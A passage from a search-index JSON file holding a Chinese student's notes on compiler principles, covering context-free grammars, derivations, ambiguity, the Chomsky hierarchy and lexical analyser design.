\u56db\u79cd\u7c7b\u578b\u6587\u6cd5\u63cf\u8ff0\u80fd\u529b\u6bd4\u8f83","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/#1","text":"\u8fd9\u5b66\u671f\u9009\u4e86\u300a\u7f16\u8bd1\u539f\u7406\u300b\u8fd9\u95e8\u8bfe\uff0c\u53d1\u73b0 \u9ad8\u7ea7\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u7684\u8bed\u6cd5\u63cf\u8ff0 \u8fd9\u90e8\u5206\u4e2d\uff0c\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5\u548c\u56db\u79cd\u4e0d\u540c\u7c7b\u578b\u7684\u6587\u6cd5\u8fd9\u4e9b\u5185\u5bb9\u6bd4\u8f83\u590d\u6742\u3002\u4e8e\u662f\u6211\u53c2\u8003\u4e2d\u56fd\u5927\u5b66MOOC- \u56fd\u9632\u79d1\u6280\u5927\u5b66\u300a\u7f16\u8bd1\u539f\u7406\u300b \u7684PPT\uff0c\u6574\u7406\u4e86\u8fd9\u4e00\u7ae0\u7684\u5185\u5bb9\uff0c\u5e0c\u671b\u80fd\u591f\u7406\u89e3\u8fd9\u90e8\u5206\u7684\u77e5\u8bc6\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/#2","text":"","title":"2. \u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/#21","text":"\u6587\u6cd5 \u5b9a\u4e49\uff1a\u63cf\u8ff0\u8bed\u8a00\u7684\u8bed\u6cd5\u7ed3\u6784\u7684\u5f62\u5f0f\u89c4\u5219\uff08\u5373\u8bed\u6cd5\u89c4\u5219\uff09 \u4e3e\u4f8b\uff1a<\u53e5\u5b50> \u2192 <\u4e3b\u8bed><\u8c13\u8bed><\u95f4\u63a5\u5bbe\u8bed><\u76f4\u63a5\u5bbe\u8bed> \u63a8\u5bfc\u51faHe gave me a book.","title":"2.1. \u6587\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/#22","text":"\u5b57\u6bcd\u8868 \uff1a\u4e00\u4e2a\u6709\u7a77\u5b57\u7b26\u96c6\uff0c\u8bb0\u4e3a \\Sigma \u5b57\u7b26 \uff1a\u5b57\u6bcd\u8868\u4e2d\u6bcf\u4e2a\u5143\u7d20\u79f0\u4e3a\u5b57\u7b26 \u5b57\uff08\u5b57\u7b26\u4e32\uff09 \uff1a\u7531 \\Sigma \u4e2d\u7684\u5b57\u7b26\u6240\u6784\u6210\u7684\u4e00\u4e2a\u6709\u7a77\u5e8f\u5217 \u7a7a\u5b57 \uff1a\u4e0d\u5305\u542b\u4efb\u4f55\u5b57\u7b26\u7684\u5e8f\u5217\u79f0\u4e3a\u7a7a\u5b57\uff0c\u8bb0\u4e3a \\epsilon \u5b57\u7684\u5168\u4f53 \uff1a \u7528 \\Sigma^* \u8868\u793a \\Sigma \u4e0a\u7684\u6240\u6709\u5b57\u7684\u5168\u4f53\uff0c\u5305\u542b\u7a7a\u5b57 \\epsilon \u8fde\u63a5\uff08\u79ef\uff09 \uff1a \\Sigma^* \u7684\u5b50\u96c6 U \u548c V \u7684\u8fde\u63a5\uff08\u79ef\uff09\u5b9a\u4e49\u4e3a UV \uff1d \\{ \\alpha \\beta | \\alpha \\in U \\& \\beta \\in V\\} \\tag{1} \u95ed\u5305 \uff1a V^* \u662f V \u7684\u95ed\u5305 V^* = V^0 \\bigcup V^1 \\bigcup V^2 \\bigcup V^3 \\bigcup \\cdots \\tag{2} \u95ed\u5305\u5305\u542b V^0 = \\epsilon \u6b63\u89c4\u95ed\u5305 \uff1a V^+ \u662f V \u7684\u6b63\u89c4\u95ed\u5305\uff1a V^+\uff1dV V^* \\tag{3} \u6b63\u89c4\u95ed\u5305\u4e0d\u542b \\epsilon","title":"2.2. \u8bed\u6cd5\u63cf\u8ff0\u7684\u51e0\u4e2a\u57fa\u672c\u6982\u5ff5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/#23","text":"\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5G\u662f\u4e00\u4e2a\u56db\u5143\u7ec4 G=(V_T\uff0cV_N\uff0cS\uff0cP) \\tag{4} \u5176\u4e2d V_T \uff1a\u7ec8\u7ed3\u7b26\uff08Terminal\uff09\u96c6\u5408(\u975e\u7a7a) V_N \uff1a\u975e\u7ec8\u7ed3\u7b26\uff08Noterminal\uff09\u96c6\u5408\uff08\u975e\u7a7a\uff09\uff0c\u4e14 V_T \\bigcap V_N = \\varnothing S \uff1a\u6587\u6cd5\u7684\u5f00\u59cb\u7b26\u53f7\uff0c S \\in V_N P \uff1a\u4ea7\u751f\u5f0f\u96c6\u5408(\u6709\u9650)\uff0c\u6bcf\u4e2a\u4ea7\u751f\u5f0f\u5f62\u5f0f\u4e3a P \\to \\alpha {\\hspace*{0.5cm}} P \\in V_N {\\hspace*{0.5cm}} \\alpha \\in (V_T \\bigcup V_N)^* \\tag{5} \u5f00\u59cb\u7b26 S \u81f3\u5c11\u5fc5\u987b\u5728\u67d0\u4e2a\u4ea7\u751f\u5f0f\u7684\u5de6\u90e8\u51fa\u73b0\u4e00\u6b21\u3002","title":"2.3. \u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/#24","text":"\u6700\u5de6\u63a8\u5bfc \u5b9a\u4e49\uff1a\u4efb\u4f55\u4e00\u6b65 \\alpha \\Rightarrow \\beta \u90fd\u662f\u5bf9 \\alpha \u4e2d\u7684\u6700\u5de6\u975e\u7ec8\u7ed3\u7b26\u8fdb\u884c\u66ff\u6362 \u6700\u53f3\u63a8\u5bfc \u5b9a\u4e49\uff1a\u4efb\u4f55\u4e00\u6b65 \\alpha \\Rightarrow \\beta \u90fd\u662f\u5bf9 \\alpha \u4e2d\u7684\u6700\u53f3\u975e\u7ec8\u7ed3\u7b26\u8fdb\u884c\u66ff\u6362","title":"2.4. \u6700\u5de6\u3001\u6700\u53f3\u63a8\u5bfc"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/#3","text":"\u8bed\u6cd5\u6811 \uff1a\u7528\u4e00\u5f20\u56fe\u8868\u793a\u4e00\u4e2a\u53e5\u578b\u7684\u63a8\u5bfc,\u79f0\u4e3a\u8bed\u6cd5\u6811\u3002 \u4e00\u68f5\u8bed\u6cd5\u6811\u662f\u4e0d\u540c\u63a8\u5bfc\u8fc7\u7a0b\u7684\u5171\u6027\u62bd\u8c61\uff0c\u4e00\u68f5\u8bed\u6cd5\u6811\u53ef\u4ee5\u5bf9\u5e94\u591a\u4e2a\u4e0d\u540c\u7684\u63a8\u5bfc\u8fc7\u7a0b\u3002","title":"3. \u8bed\u6cd5\u6811"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/#4","text":"","title":"4. \u4e8c\u4e49\u6027"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/#41","text":"\u6587\u6cd5\u7684\u4e8c\u4e49\u6027 \uff1a\u5982\u679c\u4e00\u4e2a\u6587\u6cd5\u5b58\u5728\u67d0\u4e2a\u53e5\u5b50\u5bf9\u5e94\u4e24\u68f5\u4e0d\u540c\u7684\u8bed\u6cd5\u6811\uff0c\u5219\u8bf4\u8fd9\u4e2a\u6587\u6cd5\u662f\u4e8c\u4e49\u7684","title":"4.1. \u6587\u6cd5\u7684\u4e8c\u4e49\u6027"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/#42","text":"\u8bed\u8a00\u7684\u4e8c\u4e49\u6027 \uff1a\u4e00\u4e2a\u8bed\u8a00\u662f\u4e8c\u4e49\u7684\uff0c\u5982\u679c\u5bf9\u5b83\u4e0d\u5b58\u5728\u65e0\u4e8c\u4e49\u7684\u6587\u6cd5","title":"4.2. \u8bed\u8a00\u7684\u4e8c\u4e49\u6027"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/#5","text":"\u56db\u79cd\u7c7b\u578b\u7684\u6587\u6cd5\u4e5f\u90fd\u7531\u56db\u90e8\u5206\u7ec4\u6210 G=(V_T\uff0cV_N\uff0cS\uff0cP) \\tag{6} \u5176\u4e2d V_T \uff1a\u7ec8\u7ed3\u7b26\uff08Terminal\uff09\u96c6\u5408(\u975e\u7a7a) V_N \uff1a\u975e\u7ec8\u7ed3\u7b26\uff08Noterminal\uff09\u96c6\u5408\uff08\u975e\u7a7a\uff09\uff0c\u4e14 V_T \\bigcap V_N = \\varnothing S \uff1a\u6587\u6cd5\u7684\u5f00\u59cb\u7b26\u53f7\uff0c S \\in V_N P \uff1a\u4ea7\u751f\u5f0f\u96c6\u5408(\u6709\u9650)\uff0c\u6bcf\u4e2a\u4ea7\u751f\u5f0f\u5f62\u5f0f\u4e3a P \\to \\alpha {\\hspace*{0.5cm}} P \\in V_N {\\hspace*{0.5cm}} \\alpha \\in (V_T \\bigcup V_N)^* \\tag{7}","title":"5. \u4e54\u59c6\u65af\u57fa\u5f62\u5f0f\u8bed\u8a00\u4f53\u7cfb"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/#51","text":"0\u578b\u6587\u6cd5 \uff08\u77ed\u8bed\u6587\u6cd5\uff0c\u56fe\u7075\u673a\uff09 \u4ea7\u751f\u5f0f\u5f62\u5982\uff1a \\alpha \\to \\beta \u5176\u4e2d\uff1a \\alpha \\in (V_T \\bigcup V_N)^* \u4e14\u81f3\u5c11\u542b\u6709\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26 \\beta \\in (V_T \\bigcup V_N)^* \u8bf4\u660e \uff1a\u5bf9 \\alpha \u548c \\beta \u8303\u56f4\u57fa\u672c\u6ca1\u6709\u9650\u5236\uff0c\u8981\u6c42 \\alpha \uff08\u5373\u4ea7\u751f\u5f0f\u5de6\u8fb9\uff09\u81f3\u5c11\u6709\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26","title":"5.1. \u96f6\u578b\u6587\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/#52","text":"1\u578b\u6587\u6cd5 (\u4e0a\u4e0b\u6587\u6709\u5173\u6587\u6cd5\uff0c\u7ebf\u6027\u754c\u9650\u81ea\u52a8\u673a) \u4ea7\u751f\u5f0f\u5f62\u5982\uff1a \\alpha \\to \\beta \u5176\u4e2d\uff1a |\\alpha| \u2264 |\\beta| \uff0c\u4ec5 S \\to \\epsilon \u4f8b\u5916 \u8bf4\u660e \uff1a\u8981\u6c42 \\alpha \uff08\u4ea7\u751f\u5f0f\u5de6\u8fb9\uff09\u957f\u5ea6\u5c0f\u4e8e\u53f3\u8fb9\uff0c\u9664\u5f00\u59cb\u7b26\u53f7\u76f4\u63a5\u63a8\u5bfc\u51fa\u7a7a\u5b57\u4ee5\u5916","title":"5.2. \u4e00\u578b\u6587\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/#53","text":"2\u578b\u6587\u6cd5 (\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5\uff0c\u975e\u786e\u5b9a\u4e0b\u63a8\u81ea\u52a8\u673a) \u4ea7\u751f\u5f0f\u5f62\u5982\uff1a A \\to B \u5176\u4e2d\uff1a A \\in V_N \\beta \\in (V_T \\bigcup V_N)^* \u8bf4\u660e \uff1a\u8981\u6c42 A \uff08\u5373\u4ea7\u751f\u5f0f\u5de6\u8fb9\uff09\u4e00\u5b9a\u90fd\u662f\u975e\u7ec8\u7ed3\u7b26","title":"5.3. \u4e8c\u578b\u6587\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/#54","text":"3\u578b\u6587\u6cd5 (\u6b63\u89c4\u6587\u6cd5\uff0c\u6709\u9650\u81ea\u52a8\u673a) \u53f3\u7ebf\u6027\u6587\u6cd5 \u4ea7\u751f\u5f0f\u5f62\u5982\uff1a A \\to \\alpha B \u6216 A \\to \\alpha \u5176\u4e2d\uff1a \\alpha \\in V_T^* A, B \\in V_N \u5de6\u7ebf\u6027\u6587\u6cd5 \u4ea7\u751f\u5f0f\u5f62\u5982\uff1a A \\to B\\alpha \u6216 A \\to \\alpha \u5176\u4e2d\uff1a \\alpha \\in V_T^* A, B \\in V_N \u8bf4\u660e \uff1a \u53f3\u7ebf\u6027\u6587\u6cd5\uff1a\u4ea7\u751f\u5f0f\u4e3a\u63a8\u5bfc\u505c\u6b62\u6216\u5411\u53f3\u6269\u5c55\uff0c\u5bf9\u53f3\u7aef\u8fdb\u884c\u9012\u5f52\uff0c\u4fdd\u8bc1\u5de6\u4fa7\u59cb\u7ec8\u4e3a\u7ec8\u7ed3\u7b26\u3002 \u5de6\u7ebf\u6027\u6587\u6cd5\uff1a\u4ea7\u751f\u5f0f\u4e3a\u63a8\u5bfc\u505c\u6b62\u6216\u5411\u5de6\u6269\u5c55\uff0c\u5bf9\u5de6\u7aef\u8fdb\u884c\u9012\u5f52\uff0c\u4fdd\u8bc1\u53f3\u4fa7\u59cb\u7ec8\u4e3a\u7ec8\u7ed3\u7b26\u3002","title":"5.4. \u4e09\u578b\u6587\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/#55","text":"0\u578b > 1\u578b > 2\u578b > 3\u578b \u6ce8\uff1a\u90e8\u5206\u5185\u5bb9\u6574\u7406\u81ea\u4e2d\u56fd\u5927\u5b66MOOC- \u56fd\u9632\u79d1\u6280\u5927\u5b66\u300a\u7f16\u8bd1\u539f\u7406\u300b PPT \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"5.5. \u56db\u79cd\u7c7b\u578b\u6587\u6cd5\u63cf\u8ff0\u80fd\u529b\u6bd4\u8f83"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90%E6%A6%82%E8%BF%B0/","text":"\u8bcd\u6cd5\u5206\u6790 # \u76ee\u5f55 # \u8bcd\u6cd5\u5206\u6790 \u76ee\u5f55 1. \u80cc\u666f 2. \u8bcd\u6cd5\u5206\u6790 2.1. \u7f16\u8bd1\u6d41\u7a0b 2.2. \u8bcd\u6cd5\u5206\u6790\u7684\u4efb\u52a1 2.3. \u8bcd\u6cd5\u5206\u6790\u5668\u7684\u529f\u80fd 2.4. \u8bcd\u6cd5\u5206\u6790\u5668\u7684\u8f93\u51fa 2.5. \u8bcd\u6cd5\u5206\u6790\u5668\u5728\u7f16\u8bd1\u5668\u4e2d\u5730\u4f4d 3. \u8bcd\u6cd5\u5206\u6790\u5668\u7684\u8bbe\u8ba1 3.1. \u8f93\u5165\u3001\u9884\u5904\u7406 3.2. \u8d85\u524d\u641c\u7d22 4. \u72b6\u6001\u8f6c\u6362\u56fe 5. \u53c2\u8003\u6587\u732e 1. \u80cc\u666f # \u4eca\u5929\u5b66\u4e60\u4e86\u7f16\u8bd1\u539f\u7406\u4e2d\u7684 \u8bcd\u6cd5\u5206\u6790 \u8fd9\u4e00\u7ae0\u8282\uff0c\u6211\u53c2\u8003\u4e86\u56fd\u9632\u5de5\u4e1a\u51fa\u7248\u793e \u300a\u7f16\u8bd1\u539f\u7406\u300b \u6559\u6750 1 \u548c\u4e2d\u56fd\u5927\u5b66MOOC- \u56fd\u9632\u79d1\u6280\u5927\u5b66\u300a\u7f16\u8bd1\u539f\u7406\u300b \u7684PPT\uff0c\u6574\u7406\u4e86\u8fd9\u4e00\u7ae0\u7684\u5185\u5bb9\uff0c\u5e0c\u671b\u80fd\u591f\u7406\u89e3\u8fd9\u90e8\u5206\u7684\u77e5\u8bc6\u3002 2. \u8bcd\u6cd5\u5206\u6790 # 2.1. \u7f16\u8bd1\u6d41\u7a0b # graph TB A(\u6e90\u7a0b\u5e8f) -->|\u5f00\u59cb\u7f16\u8bd1| B[\u8bcd\u6cd5\u5206\u6790\u5668] B --> |\u5355\u8bcd\u7b26\u53f7|C[\u8bed\u6cd5\u5206\u6790\u5668] C -->|\u8bed\u6cd5\u5355\u4f4d| D[\u8bed\u4e49\u5206\u6790\u4e0e\u4e2d\u95f4\u4ee3\u7801\u751f\u6210\u5668] W[\u8bed\u4e49\u5206\u6790\u4e0e\u4e2d\u95f4\u4ee3\u7801\u751f\u6210\u5668] -->|\u4e2d\u95f4\u4ee3\u7801-\u56db\u5143\u5f0f| E[\u4f18\u5316\u6bb5] E -->|\u4e2d\u95f4\u4ee3\u7801-\u56db\u5143\u5f0f| F[\u76ee\u6807\u4ee3\u7801\u751f\u6210\u5668] F -->|\u76ee\u6807\u4ee3\u7801|G(\u7f16\u8bd1\u5b8c\u6210) \\text{Figure 1. \u7f16\u8bd1\u6d41\u7a0b} 2.2. \u8bcd\u6cd5\u5206\u6790\u7684\u4efb\u52a1 # \u8bcd\u6cd5\u5206\u6790\u7684\u4efb\u52a1 \u4ece\u5de6\u81f3\u53f3\u9010\u4e2a\u5b57\u7b26\u5730\u5bf9\u6e90\u7a0b\u5e8f\u8fdb\u884c\u626b\u63cf\uff0c\u4ea7\u751f\u4e00\u4e2a\u4e2a\u5355\u8bcd\u7b26\u53f7 \u8bcd\u6cd5\u5206\u6790\u5668(Lexical Analyzer) \u626b\u63cf\u5668(Scanner) \u6267\u884c\u8bcd\u6cd5\u5206\u6790\u7684\u7a0b\u5e8f 2.3. \u8bcd\u6cd5\u5206\u6790\u5668\u7684\u529f\u80fd # \u529f\u80fd \u8f93\u5165\u6e90\u7a0b\u5e8f\u3001\u8f93\u51fa\u5355\u8bcd\u7b26\u53f7 \u5355\u8bcd\u7b26\u53f7\u7684\u79cd\u7c7b \u57fa\u672c\u5b57 :\u5982 begin\uff0crepeat\uff0cfor\uff0c... \u6807\u8bc6\u7b26 :\u7528\u6765\u8868\u793a\u5404\u79cd\u540d\u5b57\uff0c\u5982\u53d8\u91cf\u540d\u3001\u6570\u7ec4\u540d\u548c\u8fc7\u7a0b\u540d \u5e38\u6570 :\u5404\u79cd\u7c7b\u578b\u7684\u5e38\u6570 \u8fd0\u7b97\u7b26 : +\uff0c-\uff0c*\uff0c/\uff0c \\cdots \u754c\u7b26 :\u9017\u53f7\u3001\u5206\u53f7\u3001\u62ec\u53f7\u548c\u7a7a\u767d 2.4. \u8bcd\u6cd5\u5206\u6790\u5668\u7684\u8f93\u51fa # \u8f93\u51fa\u7684\u5355\u8bcd\u7b26\u53f7\u7684\u8868\u793a\u5f62\u5f0f ( \u5355\u8bcd\u79cd\u522b\uff0c\u5355\u8bcd\u81ea\u8eab\u7684\u503c ) \u5355\u8bcd\u79cd\u522b\u901a\u5e38\u7528\u6574\u6570\u7f16\u7801\u8868\u793a \u82e5\u4e00\u4e2a\u79cd\u522b\u53ea\u6709\u4e00\u4e2a\u5355\u8bcd\u7b26\u53f7\uff0c\u5219\u79cd\u522b\u7f16\u7801\u5c31\u4ee3\u8868\u8be5\u5355\u8bcd\u7b26\u53f7\u3002\u5047\u5b9a \u57fa\u672c\u5b57\u3001\u8fd0\u7b97\u7b26 \u548c \u754c\u7b26 \u90fd\u662f\u4e00\u7b26\u4e00\u79cd\u3002 \u82e5\u4e00\u4e2a\u79cd\u522b\u6709\u591a\u4e2a\u5355\u8bcd\u7b26\u53f7\uff0c\u5219\u5bf9\u4e8e\u6bcf\u4e2a\u5355\u8bcd\u7b26\u53f7\uff0c\u7ed9\u51fa\u79cd\u522b \u7f16\u7801 \u548c \u81ea\u8eab\u7684\u503c \u3002 \u6807\u8bc6\u7b26 \u5355\u5217\u4e00\u79cd;\u6807\u8bc6\u7b26\u81ea\u8eab\u7684\u503c\u8868\u793a\u6210\u6309\u673a\u5668\u5b57\u8282\u5212\u5206\u7684\u5185\u90e8\u7801 \u5e38\u6570 \u6309\u7c7b\u578b\u5206\u79cd;\u5e38\u6570\u7684\u503c\u5219\u8868\u793a\u6210\u6807\u51c6\u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f 2.5. \u8bcd\u6cd5\u5206\u6790\u5668\u5728\u7f16\u8bd1\u5668\u4e2d\u5730\u4f4d # graph LR O(\u6e90\u7a0b\u5e8f) --> |\u6e90\u7a0b\u5e8f|A A[\u8bcd\u6cd5\u5206\u6790\u5668] -->|\u5355\u8bcd\u7b26\u53f7| B[\u8bed\u6cd5\u5206\u6790\u5668] B --> |\u53d6\u4e0b\u4e00\u5355\u8bcd|A C[\u7b26\u53f7\u8868] --- A C[\u7b26\u53f7\u8868] --- B \\text{Figure 2. \u8bcd\u6cd5\u5206\u6790\u5668\u5728\u7f16\u8bd1\u5668\u4e2d\u5730\u4f4d} 3. \u8bcd\u6cd5\u5206\u6790\u5668\u7684\u8bbe\u8ba1 # 3.1. \u8f93\u5165\u3001\u9884\u5904\u7406 # \u8bcd\u6cd5\u5206\u6790\u5668\u5de5\u4f5c\u7684\u7b2c\u4e00\u6b65\u662f\u8f93\u5165\u6e90\u7a0b\u5e8f\u6587\u672c\u3002\u8f93\u5165\u4e32\u4e00\u822c\u662f\u653e\u5728\u4e00\u4e2a\u7f13\u51b2\u533a\u4e2d\uff0c\u8fd9\u4e2a\u7f13\u51b2\u533a\u79f0 \u8f93\u5165\u7f26\u51b2\u533a \u3002\u8bcd\u6cd5\u5206\u6790\u7684\u5de5\u4f5c\uff08\u5355\u8bcd\u7b26\u53f7\u7684\u8bc6\u522b\uff09\u53ef\u4ee5\u76f4\u63a5\u5728\u8fd9\u4e2a \u7f13\u51b2\u533a \u4e2d\u8fdb\u884c\u3002\u4f46\u5728\u8bb8\u591a\u60c5\u51b5\u4e0b\uff0c\u628a\u8f93\u5165\u4e32\u9884\u5904\u7406\u4e00\u4e0b\uff0c\u5bf9\u5355\u8bcd\u7b26\u53f7\u7684\u8bc6\u522b\u5de5\u4f5c\u5c06\u662f\u6bd4\u8f83\u65b9\u4fbf\u7684\u3002 \u6211\u4eec\u53ef\u4ee5\u8bbe\u60f3\u4e00\u4e2a \u9884\u5904\u7406\u5b50\u7a0b\u5e8f \uff0c\u5b83\u80fd\u591f\u5b8c\u6210\u53bb\u9664\u7a7a\u767d\u7b26\u3001\u6362\u884c\u7b26\u548c\u6ce8\u91ca\u8fd8\u6709\u5408\u5e76\u754c\u7b26\u7b49\u4efb\u52a1\u3002 \u6bcf\u5f53\u8bcd\u6cd5\u5206\u6790\u5668\u8c03\u7528\u5b83\u65f6\uff0c\u5b83\u5c31\u5904\u7406\u51fa\u4e00\u4e32\u786e\u5b9a\u957f\u5ea6\uff08\u5982120\u4e2a\u5b57\u7b26\uff09\u7684\u8f93\u5165\u5b57\u7b26\uff0c\u5e76\u5c06\u5176\u88c5\u8fdb\u8bcd\u6cd5\u5206\u6790\u5668\u6240\u6307\u5b9a\u7684\u7f13\u51b2\u533a\u4e2d\uff08\u79f0\u4e3a \u626b\u63cf\u7f13\u51b2\u533a \uff09\u3002\u8fd9\u6837\uff0c\u5206\u6790\u5668\u5c31\u53ef\u4ee5\u5728\u6b64\u7f13\u51b2\u533a\u4e2d\u76f4\u63a5\u8fdb\u884c\u5355\u8bcd\u7b26\u53f7\u7684\u8bc6\u522b\uff0c\u800c\u4e0d\u5fc5\u7ba1\u5176\u4ed6\u7e41\u7410\u4e8b\u7269\u3002 \\text{Figure 3. \u8bcd\u6cd5\u5206\u6790\u5668\u7684\u7ed3\u6784} \u5206\u6790\u5668\u5bf9\u626b\u63cf\u7f13\u51b2\u533a\u8fdb\u884c\u626b\u63cf\u65f6\u4e00\u822c\u7528\u4e24\u4e2a \u6307\u793a\u5668 \uff0c\u4e00\u4e2a\u6307\u5411\u5f53\u524d\u6b63\u5728\u8bc6\u522b\u7684\u5355\u8bcd\u7684 \u5f00\u59cb\u4f4d\u7f6e \uff08\u6307\u5411\u65b0\u5355\u8bcd\u7684\u9996\u5b57\u7b26\uff09\uff0c\u53e6\u4e00\u4e2a\u7528\u4e8e\u5411\u524d\u641c\u7d22\u4ee5\u5bfb\u627e\u5355\u8bcd\u7684\u7ec8\u70b9\u3002 \u4e0d\u8bba \u626b\u63cf\u7f13\u51b2\u533a \u8bbe\u5f97\u591a\u5927\u90fd\u4e0d\u80fd\u4fdd\u8bc1\u5355\u8bcd\u7b26\u53f7\u4e0d\u4f1a\u88ab\u5b83\u7684\u8fb9\u754c\u6240\u6253\u65ad\u3002\u56e0\u6b64\uff0c\u626b\u63cf\u7f13\u51b2\u533a\u6700\u597d\u4f7f\u7528\u4e00\u4e2a \u4e00\u5206\u4e3a\u4e8c\u7684\u533a\u57df \u3002\u5e76\u5bf9\u6807\u8bc6\u7b26\u548c\u5e38\u6570\u7684\u957f\u5ea6 \u52a0\u4ee5\u9650\u5236 \uff08\u4f8b\u5982\uff0c\u4e0d\u5f97\u591a\u4e8e120\u4e2a\u5b57\u7b26\uff09\u3002\u5426\u5219\uff0c\u5373\u4f7f\u7f13\u51b2\u533a\u518d\u5927\u4e5f\u65e0\u6d4e\u4e8e\u4e8b\u3002 \\text{Figure 4. \u626b\u63cf\u7f13\u51b2\u533a} 3.2. \u8d85\u524d\u641c\u7d22 # \u5b9a\u4e49\uff1a\u8bcd\u6cd5\u5206\u6790\u8fc7\u7a0b\u4e2d\uff0c\u6709\u65f6\u4e3a\u4e86\u786e\u5b9a\u8bcd\u6027\uff0c\u9700\u8d85\u524d\u626b\u63cf\u82e5\u5e72\u4e2a\u5b57\u7b26\u3002 \u5982\u4ee5\u4e0bFORTRAN\u8bed\u53e5\uff0c\u7528\u6237\u53ef\u4ee5\u91cd\u65b0\u5b9a\u4e49\u5173\u952e\u5b57\uff0c\u7f16\u8bd1\u5668\u5c31\u9700\u8981\u8d85\u524d\u626b\u63cf\u90fd\u5173\u952e\u5b57\u540e\u7684\u6570\u5b57\u683c\u5f0f\u624d\u80fd\u77e5\u9053\u5176\u8bcd\u6027\u3002 \\text{Figure 5. \u8d85\u524d\u641c\u7d22} \u9664\u4e86\u5173\u952e\u5b57\u9700\u8981\u8d85\u524d\u641c\u7d22\uff0c\u6807\u8bc6\u7b26\u3001\u5e38\u6570\u3001\u7b97\u7b26\u548c\u754c\u7b26\u7b49\u4e5f\u53ef\u80fd\u4f1a\u9700\u8981\u8d85\u524d\u641c\u7d22\u3002 